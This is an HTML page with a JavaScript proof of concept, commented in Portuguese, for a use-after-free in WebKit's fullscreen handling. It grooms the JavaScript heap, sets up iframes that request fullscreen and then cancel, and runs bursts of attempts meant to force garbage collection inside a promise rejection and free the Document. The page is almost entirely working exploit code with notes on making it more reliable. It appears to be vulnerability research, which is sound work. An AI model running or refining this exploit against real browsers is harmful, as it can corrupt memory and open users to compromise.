<!DOCTYPE html>
<html>
<head><title>FullscreenManager UAF PoC v2 — heap grooming</title></head>
<body>

<button id="btn" onclick="run(this)">&#9654; Run PoC v2 (clique obrigatorio)</button>
<pre id="log"></pre>

<script>
/*
 * PoC v2: Use-After-Free em FullscreenManager::requestFullscreenForElement
 * commit fix: 633fbf1 | bug: 263140
 *
 * Por que v1 nao crashou:
 *   DeferredPromise mantem Strong<JSDOMGlobalObject> → raiz nativa JSC
 *   GC externo (pre-task) nao consegue colectar o Document enquanto
 *   a task estiver na fila com o RefPtr<DeferredPromise>
 *
 * Estrategia v2: Heap Grooming
 *   Encher o heap JSC ANTES das tasks rodarem.
 *   Quando promise->reject() chama JSC::call() internamente e JSC tenta alocar,
 *   o heap cheio forca GC DENTRO de reject().
 *   Nesse momento, apos WTFMove(element) para GCReachableRef,
 *   o GC pode colectar o element → Document refcount cai → UAF em m_document
 */

function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

var L = document.getElementById('log');
function log(s) { L.textContent += '[' + new Date().toTimeString().slice(0,8) + '] ' + s + '\n'; }

/* ── Fase 1: Heap Grooming ──────────────────────────────────────
 * Criar objectos de longa duracao que reduzem o heap disponivel.
 * Mantidos vivos ate ao momento critico (promise->reject internamente).
 * Assim, quando JSC::call() em reject() tenta alocar → GC forcado.
 */
var heapBalloon = null;

function inflateBalloon() {
    heapBalloon = [];
    var allocated = 0;
    for (var i = 0; i < 5000; i++) {
        try {
            /* Arrays de strings: objectos JSC heap, nao fora do GC */
            heapBalloon.push(new Array(1000).fill('uaf_' + i));
            allocated++;
        } catch(e) {
            break; /* OOM parcial: parar antes de crashar aqui */
        }
    }
    log('Balloon: ' + allocated + ' arrays no heap JSC');
    return allocated;
}

function deflateBalloon() {
    heapBalloon = null;
    gc();
}

/* ── Fase 2: Tentativa UAF ──────────────────────────────────────
 * Com heap cheio, tasks pendentes, promise->reject() tem maior
 * probabilidade de acionar GC durante JSC::call().
 */
function attempt(n) {
    var iframe = document.body.appendChild(document.createElement('iframe'));
    var iframeDoc = iframe.contentDocument;
    var div = iframeDoc.body.appendChild(document.createElement('div'));

    var p = div.requestFullscreen();

    if (p instanceof Promise) {
        p.catch(function(e) {
            /* microtask — corre APOS failedPreflights completar */
            /* se chegamos aqui = sem crash = Document sobreviveu */
            log('[' + n + '] catch: ' + e + ' (pos-task, sem crash)');
        });
    }

    /* Cancelar sincrono: m_pendingFullscreenElement = nullptr */
    iframeDoc.webkitCancelFullScreen();

    /* Zerar todas as refs JS — Document so vive via DeferredPromise C++ */
    div       = null;
    iframeDoc = null;
    document.body.removeChild(iframe);
    iframe    = null;
    p         = null;

    /* NAO rodar gc() aqui — balloon ja esta a pressionar o heap.
     * Queremos que o GC dispare DENTRO de promise->reject(),
     * nao antes. Se corrermos gc() agora podemos aliviar pressao. */
}

/* ── Fase 3: Burst de tentativas com heap sob pressao ──────────
 * Quanto mais tentativas com heap cheio, maior a probabilidade
 * de JSC::call() dentro de reject() triggerar GC no momento certo.
 */
function runBurst(count, label) {
    log('--- burst: ' + label + ' (' + count + ' tentativas) ---');
    for (var i = 0; i < count; i++) {
        attempt(i);
    }
}

/* ── Entrada principal ─────────────────────────────────────────── */
function run(btn) {
    btn.disabled = true;
    log('=== PoC v2: FullscreenManager UAF | 633fbf1 ===');
    log('Estrategia: heap grooming + burst de attempts');
    log('');

    /* Passo 1: enchemos o balloon de heap */
    var allocated = inflateBalloon();
    if (allocated < 100) {
        log('AVISO: pouca memoria disponivel — resultado pode ser OOM antes do UAF');
    }

    /* Passo 2: burst rapido enquanto heap esta cheio
     * As tasks ficam na fila do event loop.
     * Quando o event loop processar as tasks, heap ainda cheio → 
     * promise->reject() → JSC::call() → alocacao → GC forcado */
    runBurst(20, 'heap cheio');

    /* Passo 3: adicionar pressao extra com ArrayBuffers grandes
     * (tipo de alocacao diferente — pode triggerar GC collector diferente) */
    log('--- pressao extra com ArrayBuffers ---');
    var bigBuffers = [];
    for (var j = 0; j < 10; j++) {
        try { bigBuffers.push(new ArrayBuffer(5 * 1024 * 1024)); } catch(e) { break; }
    }
    log('ArrayBuffers alocados: ' + bigBuffers.length + ' x 5MB');

    /* Passo 4: burst final com pressao maxima */
    runBurst(20, 'pressao maxima');

    /* Liberar ArrayBuffers mas manter balloon */
    bigBuffers = null;

    /* Passo 5: aguardar processamento das tasks */
    setTimeout(function() {
        log('');
        log('=== tasks processadas ===');
        log('Se chegou aqui: Document sobreviveu ao GC interno de reject()');
        log('Hipoteses: (1) fix no binario, (2) GC nao triggera durante JSC::call()');
        log('           (3) Strong<JSDOMGlobalObject> nao foi cleared durante reject()');
        deflateBalloon();
        log('Balloon liberado.');
    }, 5000);
}
</script>

</body>
</html>
